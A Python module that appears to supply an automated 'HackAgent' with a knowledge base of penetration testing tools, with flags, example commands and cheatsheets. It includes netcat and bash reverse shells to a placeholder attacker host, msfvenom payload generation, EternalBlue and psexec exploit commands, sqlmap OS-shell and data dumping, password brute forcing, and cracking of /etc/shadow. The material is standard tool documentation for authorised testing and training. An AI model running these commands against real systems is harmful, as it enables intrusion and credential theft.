#!/usr/bin/env python3
"""
HackAgent Tool Knowledge Base
Comprehensive database of penetration testing tools with usage patterns.

ETHICAL USE ONLY - Only use on authorized targets!
"""

from dataclasses import dataclass, field
from typing import List, Dict, Optional
from enum import Enum
import json
from pathlib import Path


class ToolCategory(Enum):
    RECON = "reconnaissance"
    SCANNING = "vulnerability_scanning"
    EXPLOITATION = "exploitation"
    POST_EXPLOIT = "post_exploitation"
    WEB_APP = "web_application"
    NETWORK = "network"
    WIRELESS = "wireless"
    PASSWORD = "password_cracking"
    FORENSICS = "forensics"
    SOCIAL_ENG = "social_engineering"


@dataclass
class Tool:
    """Represents a penetration testing tool with knowledge."""
    name: str
    category: ToolCategory
    description: str
    installation: str
    basic_usage: List[str]
    advanced_usage: List[str]
    common_flags: Dict[str, str]
    example_commands: List[Dict[str, str]]
    cheatsheet: List[str]
    tips: List[str]
    related_tools: List[str]
    practice_targets: List[str] = field(default_factory=list)


class ToolKnowledgeBase:
    """
    Comprehensive knowledge base for penetration testing tools.
    HackAgent uses this to learn and execute tools effectively.
    """
    
    def __init__(self):
        self.tools: Dict[str, Tool] = {}
        self._load_tools()
    
    def _load_tools(self):
        """Load all tool knowledge."""
        
        # =================================================================
        # RECONNAISSANCE TOOLS
        # =================================================================
        
        self.tools["nmap"] = Tool(
            name="nmap",
            category=ToolCategory.RECON,
            description="Network exploration and security auditing tool. The Swiss army knife of port scanning.",
            installation="apt install nmap",
            basic_usage=[
                "nmap <target>",
                "nmap -sV <target>",
                "nmap -A <target>",
            ],
            advanced_usage=[
                "nmap -sS -sV -O -A -p- <target>",
                "nmap --script vuln <target>",
                "nmap -sU -p 1-1000 <target>",
            ],
            common_flags={
                "-sS": "TCP SYN scan (stealth)",
                "-sT": "TCP connect scan",
                "-sU": "UDP scan",
                "-sV": "Version detection",
                "-O": "OS detection",
                "-A": "Aggressive scan (OS, version, scripts, traceroute)",
                "-p-": "Scan all 65535 ports",
                "-p 1-1000": "Scan ports 1-1000",
                "--script": "Run NSE scripts",
                "-oN": "Output normal format",
                "-oX": "Output XML format",
                "-oG": "Output grepable format",
                "-T4": "Aggressive timing",
                "-Pn": "Skip host discovery",
                "--top-ports 1000": "Scan top 1000 ports",
            },
            example_commands=[
                {"desc": "Quick scan", "cmd": "nmap -T4 -F 192.168.1.1"},
                {"desc": "Full TCP scan", "cmd": "nmap -sS -sV -O -p- 192.168.1.1"},
                {"desc": "Vuln scan", "cmd": "nmap --script vuln 192.168.1.1"},
                {"desc": "SMB vuln check", "cmd": "nmap --script smb-vuln* -p 445 192.168.1.1"},
                {"desc": "HTTP enumeration", "cmd": "nmap --script http-enum -p 80,443 192.168.1.1"},
                {"desc": "Subnet scan", "cmd": "nmap -sn 192.168.1.0/24"},
            ],
            cheatsheet=[
                "# Quick host discovery",
                "nmap -sn 192.168.1.0/24",
                "",
                "# Full port scan with version detection",
                "nmap -sS -sV -p- -T4 <target>",
                "",
                "# Vulnerability scan",
                "nmap --script vuln <target>",
                "",
                "# OS detection",
                "nmap -O <target>",
                "",
                "# Firewall evasion",
                "nmap -f -D RND:10 <target>",
            ],
            tips=[
                "Start with -sn for host discovery before full scans",
                "Use -T4 for faster scans, -T1 for stealth",
                "Always use -sV for service version detection",
                "--script=safe runs only safe scripts",
                "Save output: -oA output_base saves in all formats",
            ],
            related_tools=["masscan", "rustscan", "unicornscan"],
            practice_targets=["scanme.nmap.org", "Metasploitable", "DVWA"]
        )
        
        self.tools["gobuster"] = Tool(
            name="gobuster",
            category=ToolCategory.RECON,
            description="Directory/file & DNS busting tool written in Go. Fast and flexible.",
            installation="apt install gobuster",
            basic_usage=[
                "gobuster dir -u <url> -w <wordlist>",
                "gobuster dns -d <domain> -w <wordlist>",
                "gobuster vhost -u <url> -w <wordlist>",
            ],
            advanced_usage=[
                "gobuster dir -u <url> -w <wordlist> -x php,html,txt -t 50",
                "gobuster dir -u <url> -w <wordlist> -b 404,403 -s 200,301,302",
            ],
            common_flags={
                "-u": "Target URL",
                "-w": "Wordlist path",
                "-t": "Number of threads",
                "-x": "File extensions to search",
                "-s": "Status codes to match",
                "-b": "Status codes to blacklist",
                "-o": "Output file",
                "-k": "Skip TLS verification",
                "-r": "Follow redirects",
                "-c": "Cookies",
                "-H": "Headers",
            },
            example_commands=[
                {"desc": "Basic dir scan", "cmd": "gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt"},
                {"desc": "With extensions", "cmd": "gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html"},
                {"desc": "DNS bruteforce", "cmd": "gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"},
                {"desc": "VHost discovery", "cmd": "gobuster vhost -u http://target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"},
            ],
            cheatsheet=[
                "# Directory busting",
                "gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt -t 50",
                "",
                "# With extensions",
                "gobuster dir -u http://target -w wordlist.txt -x php,html,txt,bak",
                "",
                "# DNS subdomain enum",
                "gobuster dns -d target.com -w subdomains.txt",
                "",
                "# Virtual host discovery",
                "gobuster vhost -u http://target -w vhosts.txt",
            ],
            tips=[
                "Use SecLists for comprehensive wordlists",
                "Increase threads (-t 50) for faster scans",
                "Add -k flag for HTTPS with bad certs",
                "Use -x to add file extensions",
                "Try different wordlists: common.txt, big.txt, raft-*",
            ],
            related_tools=["ffuf", "dirsearch", "feroxbuster", "wfuzz"],
            practice_targets=["DVWA", "OWASP Juice Shop", "HackTheBox"]
        )
        
        self.tools["ffuf"] = Tool(
            name="ffuf",
            category=ToolCategory.WEB_APP,
            description="Fast web fuzzer written in Go. Extremely flexible for parameter fuzzing.",
            installation="apt install ffuf",
            basic_usage=[
                "ffuf -u http://target/FUZZ -w wordlist.txt",
                "ffuf -u http://target/?param=FUZZ -w wordlist.txt",
            ],
            advanced_usage=[
                "ffuf -u http://target/FUZZ -w wordlist.txt -mc 200,301 -fc 404",
                "ffuf -u http://target -H 'Host: FUZZ.target.com' -w subdomains.txt",
                "ffuf -u http://target/api/users/FUZZ -w ids.txt -mr 'admin'",
            ],
            common_flags={
                "-u": "Target URL (FUZZ marks injection point)",
                "-w": "Wordlist",
                "-mc": "Match status codes",
                "-fc": "Filter status codes",
                "-ms": "Match response size",
                "-fs": "Filter response size",
                "-mr": "Match regex",
                "-fr": "Filter regex",
                "-H": "Header",
                "-X": "HTTP method",
                "-d": "POST data",
                "-t": "Threads",
                "-o": "Output file",
                "-of": "Output format (json, csv, html)",
            },
            example_commands=[
                {"desc": "Directory fuzzing", "cmd": "ffuf -u http://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt"},
                {"desc": "Parameter fuzzing", "cmd": "ffuf -u 'http://target/page?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"},
                {"desc": "VHost discovery", "cmd": "ffuf -u http://target -H 'Host: FUZZ.target.com' -w subdomains.txt -fs 1234"},
                {"desc": "POST data fuzzing", "cmd": "ffuf -u http://target/login -X POST -d 'user=admin&pass=FUZZ' -w passwords.txt"},
                {"desc": "IDOR testing", "cmd": "ffuf -u http://target/api/users/FUZZ -w <(seq 1 1000)"},
            ],
            cheatsheet=[
                "# Directory fuzzing",
                "ffuf -u http://target/FUZZ -w wordlist.txt",
                "",
                "# Filter by size (remove noise)",
                "ffuf -u http://target/FUZZ -w wordlist.txt -fs 4242",
                "",
                "# Multiple fuzz points",
                "ffuf -u http://target/FUZZ/FUZ2Z -w dirs.txt:FUZZ -w files.txt:FUZ2Z",
                "",
                "# POST request",
                "ffuf -u http://target/login -X POST -H 'Content-Type: application/json' -d '{\"user\":\"FUZZ\",\"pass\":\"test\"}' -w users.txt",
            ],
            tips=[
                "Use -fs to filter out common response sizes",
                "FUZZ can be placed anywhere in URL, headers, or body",
                "Use multiple wordlists with different FUZZ markers",
                "-mc all -fc 404 matches everything except 404",
                "Increase threads (-t 100) for faster fuzzing",
            ],
            related_tools=["gobuster", "wfuzz", "feroxbuster"],
            practice_targets=["OWASP Juice Shop", "DVWA", "HackTheBox"]
        )
        
        # =================================================================
        # VULNERABILITY SCANNING
        # =================================================================
        
        self.tools["nikto"] = Tool(
            name="nikto",
            category=ToolCategory.SCANNING,
            description="Web server scanner that tests for dangerous files, outdated software, and misconfigurations.",
            installation="apt install nikto",
            basic_usage=[
                "nikto -h <target>",
                "nikto -h <target> -ssl",
            ],
            advanced_usage=[
                "nikto -h <target> -Tuning x6",
                "nikto -h <target> -Plugins outdated",
            ],
            common_flags={
                "-h": "Target host",
                "-p": "Target port",
                "-ssl": "Force SSL",
                "-Tuning": "Scan tuning (1-9, x for all)",
                "-Plugins": "Select plugins",
                "-o": "Output file",
                "-Format": "Output format (txt, htm, xml)",
                "-useproxy": "Use proxy",
            },
            example_commands=[
                {"desc": "Basic scan", "cmd": "nikto -h http://target.com"},
                {"desc": "SSL scan", "cmd": "nikto -h https://target.com -ssl"},
                {"desc": "Full scan", "cmd": "nikto -h http://target.com -Tuning x -o output.html -Format htm"},
            ],
            cheatsheet=[
                "# Basic web scan",
                "nikto -h http://target",
                "",
                "# SSL scan",
                "nikto -h https://target -ssl",
                "",
                "# Full tuning",
                "nikto -h http://target -Tuning x",
            ],
            tips=[
                "Nikto is noisy - use for thorough scanning, not stealth",
                "Run with -ssl for HTTPS targets",
                "Use -Tuning x for comprehensive scan",
                "Check for default credentials and misconfigs",
            ],
            related_tools=["nuclei", "wpscan", "joomscan"],
            practice_targets=["DVWA", "Metasploitable", "bWAPP"]
        )
        
        self.tools["nuclei"] = Tool(
            name="nuclei",
            category=ToolCategory.SCANNING,
            description="Fast vulnerability scanner based on templates. Community-driven templates for latest CVEs.",
            installation="go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
            basic_usage=[
                "nuclei -u <url>",
                "nuclei -l urls.txt",
                "nuclei -u <url> -t cves/",
            ],
            advanced_usage=[
                "nuclei -u <url> -t cves/ -severity critical,high",
                "nuclei -u <url> -as -rl 100",
                "nuclei -u <url> -t http/vulnerabilities/",
            ],
            common_flags={
                "-u": "Single target URL",
                "-l": "List of target URLs",
                "-t": "Template or directory",
                "-severity": "Filter by severity",
                "-as": "Automatic scan",
                "-rl": "Rate limit",
                "-c": "Concurrent templates",
                "-o": "Output file",
                "-silent": "Silent mode",
                "-update-templates": "Update templates",
            },
            example_commands=[
                {"desc": "Basic scan", "cmd": "nuclei -u http://target.com"},
                {"desc": "CVE scan", "cmd": "nuclei -u http://target.com -t cves/ -severity critical,high"},
                {"desc": "Tech detection", "cmd": "nuclei -u http://target.com -t technologies/"},
                {"desc": "Exposed panels", "cmd": "nuclei -u http://target.com -t exposed-panels/"},
                {"desc": "Batch scan", "cmd": "nuclei -l urls.txt -t cves/ -o results.txt"},
            ],
            cheatsheet=[
                "# Update templates first",
                "nuclei -update-templates",
                "",
                "# Full auto scan",
                "nuclei -u http://target -as",
                "",
                "# CVEs only",
                "nuclei -u http://target -t cves/ -severity critical,high",
                "",
                "# Multiple targets",
                "cat urls.txt | nuclei -t cves/",
            ],
            tips=[
                "Update templates regularly: nuclei -update-templates",
                "Use -as for automatic smart scan",
                "Start with -severity critical,high",
                "Community templates cover latest CVEs quickly",
                "Create custom templates for specific targets",
            ],
            related_tools=["nikto", "wpscan", "nmap --script vuln"],
            practice_targets=["HackTheBox", "TryHackMe", "VulnHub"]
        )
        
        # =================================================================
        # EXPLOITATION TOOLS
        # =================================================================
        
        self.tools["metasploit"] = Tool(
            name="metasploit",
            category=ToolCategory.EXPLOITATION,
            description="World's most used penetration testing framework. Contains exploits, payloads, and auxiliary modules.",
            installation="apt install metasploit-framework",
            basic_usage=[
                "msfconsole",
                "search <exploit>",
                "use <module>",
                "set RHOSTS <target>",
                "exploit",
            ],
            advanced_usage=[
                "msfconsole -q -x 'use exploit/...; set RHOSTS target; exploit'",
                "msfvenom -p windows/meterpreter/reverse_tcp LHOST=... LPORT=... -f exe > shell.exe",
            ],
            common_flags={
                "search": "Search for modules",
                "use": "Select a module",
                "info": "Show module info",
                "show options": "Show required options",
                "set": "Set option value",
                "setg": "Set global option",
                "run/exploit": "Execute the module",
                "sessions": "List active sessions",
                "background": "Background current session",
            },
            example_commands=[
                {"desc": "EternalBlue", "cmd": "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.1; set LHOST eth0; exploit"},
                {"desc": "SMB psexec", "cmd": "use exploit/windows/smb/psexec; set RHOSTS 192.168.1.1; set SMBUser admin; set SMBPass password; exploit"},
                {"desc": "Generate payload", "cmd": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f elf > shell.elf"},
                {"desc": "Handler", "cmd": "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST eth0; set LPORT 4444; exploit"},
            ],
            cheatsheet=[
                "# Start msfconsole",
                "msfconsole -q",
                "",
                "# Search for exploits",
                "search type:exploit name:smb",
                "search cve:2021",
                "",
                "# Use and configure exploit",
                "use exploit/windows/smb/ms17_010_eternalblue",
                "show options",
                "set RHOSTS 192.168.1.1",
                "set LHOST eth0",
                "exploit",
                "",
                "# Msfvenom payloads",
                "msfvenom -l payloads | grep windows",
                "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f exe -o shell.exe",
            ],
            tips=[
                "Always 'show options' before exploit",
                "Use db_nmap for integrated scanning",
                "set LHOST to your interface (eth0, tun0)",
                "Background sessions with Ctrl+Z",
                "Use multi/handler for payload callbacks",
                "msfvenom for standalone payloads",
            ],
            related_tools=["searchsploit", "msfvenom", "armitage"],
            practice_targets=["Metasploitable 2", "Metasploitable 3", "VulnHub"]
        )
        
        self.tools["sqlmap"] = Tool(
            name="sqlmap",
            category=ToolCategory.WEB_APP,
            description="Automatic SQL injection and database takeover tool.",
            installation="apt install sqlmap",
            basic_usage=[
                "sqlmap -u 'http://target?id=1'",
                "sqlmap -u 'http://target?id=1' --dbs",
                "sqlmap -u 'http://target?id=1' -D db --tables",
            ],
            advanced_usage=[
                "sqlmap -u 'http://target?id=1' --os-shell",
                "sqlmap -r request.txt --batch --level 5 --risk 3",
                "sqlmap -u 'http://target?id=1' --tamper=space2comment",
            ],
            common_flags={
                "-u": "Target URL with parameter",
                "-r": "Request from file (Burp)",
                "-p": "Testable parameter",
                "--dbs": "Enumerate databases",
                "-D": "Select database",
                "--tables": "Enumerate tables",
                "-T": "Select table",
                "--dump": "Dump table data",
                "--os-shell": "Get OS shell",
                "--batch": "Non-interactive mode",
                "--level": "Level of tests (1-5)",
                "--risk": "Risk of tests (1-3)",
                "--tamper": "Use tamper scripts",
                "--technique": "SQLi techniques (BEUSTQ)",
            },
            example_commands=[
                {"desc": "Basic test", "cmd": "sqlmap -u 'http://target/page?id=1'"},
                {"desc": "Get databases", "cmd": "sqlmap -u 'http://target/page?id=1' --dbs"},
                {"desc": "Dump table", "cmd": "sqlmap -u 'http://target/page?id=1' -D mydb -T users --dump"},
                {"desc": "OS shell", "cmd": "sqlmap -u 'http://target/page?id=1' --os-shell"},
                {"desc": "From Burp request", "cmd": "sqlmap -r request.txt --batch"},
                {"desc": "WAF bypass", "cmd": "sqlmap -u 'http://target/page?id=1' --tamper=space2comment,randomcase"},
            ],
            cheatsheet=[
                "# Basic detection",
                "sqlmap -u 'http://target?id=1'",
                "",
                "# Enumerate databases",
                "sqlmap -u 'http://target?id=1' --dbs",
                "",
                "# Enumerate tables",
                "sqlmap -u 'http://target?id=1' -D database --tables",
                "",
                "# Dump data",
                "sqlmap -u 'http://target?id=1' -D database -T users --dump",
                "",
                "# Get shell",
                "sqlmap -u 'http://target?id=1' --os-shell",
                "",
                "# From Burp request file",
                "sqlmap -r request.txt --batch --level 5 --risk 3",
            ],
            tips=[
                "Capture request with Burp, use with -r for complex requests",
                "Use --batch for non-interactive (CTF/automation)",
                "--level 5 --risk 3 for thorough testing",
                "Use --tamper scripts for WAF bypass",
                "--technique=B for blind SQLi only",
                "--os-shell for command execution via SQLi",
            ],
            related_tools=["burpsuite", "sqlninja", "jsql-injection"],
            practice_targets=["DVWA", "bWAPP", "SQLi-labs"]
        )
        
        self.tools["burpsuite"] = Tool(
            name="burpsuite",
            category=ToolCategory.WEB_APP,
            description="Web security testing platform. Intercept, modify, and analyze HTTP traffic.",
            installation="Download from portswigger.net or apt install burpsuite",
            basic_usage=[
                "burpsuite &",
                "Configure browser proxy: 127.0.0.1:8080",
                "Enable intercept in Proxy tab",
            ],
            advanced_usage=[
                "Use Intruder for automated attacks",
                "Scanner for vulnerability detection",
                "Extender for custom plugins",
            ],
            common_flags={
                "Proxy": "Intercept and modify requests",
                "Repeater": "Manual request testing",
                "Intruder": "Automated attacks",
                "Scanner": "Vulnerability scanning (Pro)",
                "Decoder": "Encode/decode data",
                "Comparer": "Compare responses",
                "Extender": "Add plugins",
            },
            example_commands=[
                {"desc": "Start Burp", "cmd": "java -jar burpsuite.jar"},
                {"desc": "Export to SQLMap", "cmd": "Right-click request -> Copy to file -> sqlmap -r request.txt"},
            ],
            cheatsheet=[
                "# Proxy setup",
                "1. Start Burp Suite",
                "2. Go to Proxy -> Options",
                "3. Ensure listener on 127.0.0.1:8080",
                "4. Configure browser to use proxy",
                "5. Enable Intercept",
                "",
                "# Intruder attack",
                "1. Send request to Intruder (Ctrl+I)",
                "2. Mark positions with $",
                "3. Choose attack type",
                "4. Add payloads",
                "5. Start attack",
            ],
            tips=[
                "Use FoxyProxy for easy proxy switching",
                "Install CA cert for HTTPS interception",
                "Send requests to Repeater for manual testing",
                "Use Intruder for brute force and fuzzing",
                "Export requests for sqlmap/other tools",
            ],
            related_tools=["OWASP ZAP", "mitmproxy", "Caido"],
            practice_targets=["PortSwigger Web Security Academy", "DVWA", "OWASP Juice Shop"]
        )
        
        # =================================================================
        # PASSWORD ATTACKS
        # =================================================================
        
        self.tools["hydra"] = Tool(
            name="hydra",
            category=ToolCategory.PASSWORD,
            description="Fast and flexible online password cracking tool. Supports many protocols.",
            installation="apt install hydra",
            basic_usage=[
                "hydra -l user -P passwords.txt ssh://target",
                "hydra -L users.txt -P passwords.txt target http-post-form",
            ],
            advanced_usage=[
                "hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 ssh://target",
                "hydra -L users.txt -P pass.txt target http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'",
            ],
            common_flags={
                "-l": "Single username",
                "-L": "Username list",
                "-p": "Single password",
                "-P": "Password list",
                "-t": "Number of threads",
                "-s": "Target port",
                "-f": "Exit on first success",
                "-V": "Verbose output",
                "-o": "Output file",
            },
            example_commands=[
                {"desc": "SSH brute force", "cmd": "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1"},
                {"desc": "FTP attack", "cmd": "hydra -L users.txt -P passwords.txt ftp://192.168.1.1"},
                {"desc": "HTTP POST form", "cmd": "hydra -l admin -P passwords.txt 192.168.1.1 http-post-form '/login:username=^USER^&password=^PASS^:Invalid'"},
                {"desc": "SMB attack", "cmd": "hydra -L users.txt -P passwords.txt smb://192.168.1.1"},
            ],
            cheatsheet=[
                "# SSH",
                "hydra -l root -P wordlist.txt ssh://target",
                "",
                "# FTP",
                "hydra -L users.txt -P passwords.txt ftp://target",
                "",
                "# HTTP Basic Auth",
                "hydra -l admin -P passwords.txt target http-get /admin/",
                "",
                "# HTTP POST Form",
                "hydra -l admin -P passwords.txt target http-post-form '/login:user=^USER^&pass=^PASS^:F=Invalid'",
                "",
                "# RDP",
                "hydra -l administrator -P passwords.txt rdp://target",
            ],
            tips=[
                "Use -t 4 to limit threads (avoid lockouts)",
                "^USER^ and ^PASS^ are placeholders for credentials",
                "Identify failure message for http-post-form",
                "Use -f to stop on first success",
                "Be careful with account lockouts!",
            ],
            related_tools=["medusa", "ncrack", "patator"],
            practice_targets=["Metasploitable", "VulnHub machines"]
        )
        
        self.tools["john"] = Tool(
            name="john",
            category=ToolCategory.PASSWORD,
            description="John the Ripper - Fast password cracker. Supports many hash types.",
            installation="apt install john",
            basic_usage=[
                "john hashes.txt",
                "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",
                "john --show hashes.txt",
            ],
            advanced_usage=[
                "john --format=raw-md5 --wordlist=rockyou.txt hashes.txt",
                "john --rules=best64 --wordlist=rockyou.txt hashes.txt",
            ],
            common_flags={
                "--wordlist": "Wordlist to use",
                "--format": "Hash format",
                "--rules": "Word mangling rules",
                "--show": "Show cracked passwords",
                "--list=formats": "List supported formats",
                "--incremental": "Brute force mode",
            },
            example_commands=[
                {"desc": "Crack with wordlist", "cmd": "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt"},
                {"desc": "Specify format", "cmd": "john --format=raw-sha256 --wordlist=rockyou.txt hashes.txt"},
                {"desc": "Show cracked", "cmd": "john --show hashes.txt"},
                {"desc": "Unshadow Linux", "cmd": "unshadow /etc/passwd /etc/shadow > unshadowed.txt && john unshadowed.txt"},
            ],
            cheatsheet=[
                "# Basic crack",
                "john hashes.txt",
                "",
                "# With wordlist",
                "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",
                "",
                "# Specify format",
                "john --format=raw-md5 hashes.txt",
                "",
                "# Show cracked passwords",
                "john --show hashes.txt",
                "",
                "# Linux passwd/shadow",
                "unshadow /etc/passwd /etc/shadow > combined.txt",
                "john combined.txt",
            ],
            tips=[
                "John auto-detects hash format (usually)",
                "Use --list=formats to see supported types",
                "Combine with hashcat for GPU acceleration",
                "Use rules for password mutations",
                "~/.john/john.pot stores cracked hashes",
            ],
            related_tools=["hashcat", "ophcrack", "hash-identifier"],
            practice_targets=["Capture The Flag challenges", "VulnHub"]
        )
        
        self.tools["hashcat"] = Tool(
            name="hashcat",
            category=ToolCategory.PASSWORD,
            description="World's fastest password recovery tool. GPU-accelerated.",
            installation="apt install hashcat",
            basic_usage=[
                "hashcat -m 0 hashes.txt wordlist.txt",
                "hashcat -m 0 -a 0 hashes.txt wordlist.txt",
            ],
            advanced_usage=[
                "hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a",
                "hashcat -m 0 -a 0 -r rules/best64.rule hashes.txt wordlist.txt",
            ],
            common_flags={
                "-m": "Hash type (0=MD5, 100=SHA1, 1000=NTLM, etc.)",
                "-a": "Attack mode (0=dict, 1=combinator, 3=brute, 6=hybrid)",
                "-r": "Rules file",
                "-o": "Output file",
                "--show": "Show cracked",
                "-w": "Workload profile (1-4)",
                "--force": "Ignore warnings",
            },
            example_commands=[
                {"desc": "MD5 dictionary", "cmd": "hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt"},
                {"desc": "NTLM", "cmd": "hashcat -m 1000 -a 0 hashes.txt rockyou.txt"},
                {"desc": "With rules", "cmd": "hashcat -m 0 -a 0 -r /usr/share/hashcat/rules/best64.rule hashes.txt rockyou.txt"},
                {"desc": "Brute force", "cmd": "hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a"},
            ],
            cheatsheet=[
                "# Common hash modes (-m)",
                "# 0 = MD5",
                "# 100 = SHA1",
                "# 1000 = NTLM",
                "# 1800 = SHA512crypt ($6$)",
                "# 3200 = bcrypt",
                "# 5600 = NetNTLMv2",
                "",
                "# Dictionary attack",
                "hashcat -m 0 -a 0 hashes.txt wordlist.txt",
                "",
                "# With rules",
                "hashcat -m 0 -a 0 -r rules/best64.rule hashes.txt wordlist.txt",
                "",
                "# Brute force",
                "hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a",
                "",
                "# Show cracked",
                "hashcat -m 0 hashes.txt --show",
            ],
            tips=[
                "Use GPU for much faster cracking",
                "hash-identifier can identify hash types",
                "-m 0 = MD5, -m 1000 = NTLM, -m 1800 = SHA512crypt",
                "Rules dramatically increase crack rate",
                "--show to display already cracked hashes",
            ],
            related_tools=["john", "hash-identifier", "haiti"],
            practice_targets=["CrackMe challenges", "CTF competitions"]
        )
        
        # =================================================================
        # NETWORK TOOLS
        # =================================================================
        
        self.tools["netcat"] = Tool(
            name="netcat",
            category=ToolCategory.NETWORK,
            description="TCP/UDP networking utility. The 'Swiss army knife' of networking.",
            installation="apt install netcat-traditional",
            basic_usage=[
                "nc -lvnp 4444",  # Listen
                "nc target 4444",  # Connect
            ],
            advanced_usage=[
                "nc -lvnp 4444 -e /bin/bash",
                "nc target 4444 < file.txt",
            ],
            common_flags={
                "-l": "Listen mode",
                "-v": "Verbose",
                "-n": "No DNS resolution",
                "-p": "Local port",
                "-e": "Execute program (traditional nc only)",
                "-u": "UDP mode",
                "-z": "Zero-I/O mode (scanning)",
                "-w": "Timeout",
            },
            example_commands=[
                {"desc": "Listen for shell", "cmd": "nc -lvnp 4444"},
                {"desc": "Reverse shell", "cmd": "nc attacker_ip 4444 -e /bin/bash"},
                {"desc": "Port scan", "cmd": "nc -zvn target 20-100"},
                {"desc": "File transfer", "cmd": "nc -lvnp 4444 > file.txt  # receiver\nnc target 4444 < file.txt  # sender"},
                {"desc": "Chat", "cmd": "nc -lvnp 4444  # host\nnc target 4444  # client"},
            ],
            cheatsheet=[
                "# Listener (catch reverse shell)",
                "nc -lvnp 4444",
                "",
                "# Connect to port",
                "nc target 4444",
                "",
                "# Bash reverse shell",
                "bash -i >& /dev/tcp/attacker/4444 0>&1",
                "",
                "# Port scan",
                "nc -zvn target 20-100",
                "",
                "# File transfer",
                "# Receiver:",
                "nc -lvnp 4444 > received.txt",
                "# Sender:",
                "nc target 4444 < send.txt",
            ],
            tips=[
                "nc -e only works in traditional netcat",
                "Use rlwrap nc -lvnp 4444 for better shell",
                "Alternative: ncat from nmap package",
                "Upgrade shell: python -c 'import pty;pty.spawn(\"/bin/bash\")'",
            ],
            related_tools=["ncat", "socat", "pwncat"],
            practice_targets=["Any reverse shell practice"]
        )
        
        self.tools["wireshark"] = Tool(
            name="wireshark",
            category=ToolCategory.NETWORK,
            description="Network protocol analyzer. Capture and analyze network traffic.",
            installation="apt install wireshark",
            basic_usage=[
                "wireshark &",
                "tshark -i eth0",
            ],
            advanced_usage=[
                "tshark -i eth0 -f 'port 80' -w capture.pcap",
                "tshark -r capture.pcap -Y 'http.request'",
            ],
            common_flags={
                "-i": "Interface to capture",
                "-f": "Capture filter (BPF)",
                "-Y": "Display filter",
                "-w": "Write to file",
                "-r": "Read from file",
                "-c": "Capture count",
            },
            example_commands=[
                {"desc": "Capture HTTP", "cmd": "tshark -i eth0 -f 'port 80'"},
                {"desc": "Save capture", "cmd": "tshark -i eth0 -w capture.pcap"},
                {"desc": "Read pcap", "cmd": "tshark -r capture.pcap -Y 'http.request'"},
                {"desc": "Extract credentials", "cmd": "tshark -r capture.pcap -Y 'http.request.method == POST'"},
            ],
            cheatsheet=[
                "# Common display filters",
                "ip.addr == 192.168.1.1",
                "tcp.port == 80",
                "http.request",
                "dns",
                "ftp",
                "http.request.method == POST",
                "tcp.flags.syn == 1",
                "",
                "# Capture filters (BPF)",
                "host 192.168.1.1",
                "port 80",
                "tcp",
                "not arp",
            ],
            tips=[
                "Right-click -> Follow TCP Stream for conversation",
                "Statistics -> Protocol Hierarchy for overview",
                "File -> Export Objects for HTTP/SMB files",
                "Use display filters to focus on relevant traffic",
            ],
            related_tools=["tcpdump", "tshark", "NetworkMiner"],
            practice_targets=["CTF network challenges", "Malware analysis"]
        )
        
    def get_tool(self, name: str) -> Optional[Tool]:
        """Get tool by name."""
        return self.tools.get(name.lower())
    
    def list_tools(self, category: ToolCategory = None) -> List[str]:
        """List available tools, optionally by category."""
        if category:
            return [name for name, tool in self.tools.items() if tool.category == category]
        return list(self.tools.keys())
    
    def search_tools(self, query: str) -> List[Tool]:
        """Search tools by name or description."""
        query = query.lower()
        results = []
        for tool in self.tools.values():
            if query in tool.name.lower() or query in tool.description.lower():
                results.append(tool)
        return results
    
    def get_cheatsheet(self, tool_name: str) -> str:
        """Get formatted cheatsheet for a tool."""
        tool = self.get_tool(tool_name)
        if not tool:
            return f"Tool '{tool_name}' not found."
        
        output = f"# {tool.name.upper()} CHEATSHEET\n"
        output += f"# {tool.description}\n\n"
        output += "\n".join(tool.cheatsheet)
        output += "\n\n# Tips:\n"
        for tip in tool.tips:
            output += f"# - {tip}\n"
        return output
    
    def export_knowledge(self, output_path: Path):
        """Export all tool knowledge to JSON."""
        data = {}
        for name, tool in self.tools.items():
            data[name] = {
                "name": tool.name,
                "category": tool.category.value,
                "description": tool.description,
                "installation": tool.installation,
                "basic_usage": tool.basic_usage,
                "advanced_usage": tool.advanced_usage,
                "common_flags": tool.common_flags,
                "example_commands": tool.example_commands,
                "cheatsheet": tool.cheatsheet,
                "tips": tool.tips,
                "related_tools": tool.related_tools,
                "practice_targets": tool.practice_targets,
            }
        
        with open(output_path, 'w') as f:
            json.dump(data, f, indent=2)
        
        return output_path


# Singleton instance
_kb = None

def get_tool_knowledge() -> ToolKnowledgeBase:
    """Get the tool knowledge base singleton."""
    global _kb
    if _kb is None:
        _kb = ToolKnowledgeBase()
    return _kb


if __name__ == "__main__":
    kb = get_tool_knowledge()
    
    print("=" * 60)
    print("HACKAGENT TOOL KNOWLEDGE BASE")
    print("=" * 60)
    
    print(f"\nTotal tools: {len(kb.tools)}")
    print("\nTools by category:")
    for cat in ToolCategory:
        tools = kb.list_tools(cat)
        if tools:
            print(f"  {cat.value}: {', '.join(tools)}")
    
    print("\n" + "=" * 60)
    print("NMAP CHEATSHEET")
    print("=" * 60)
    print(kb.get_cheatsheet("nmap"))
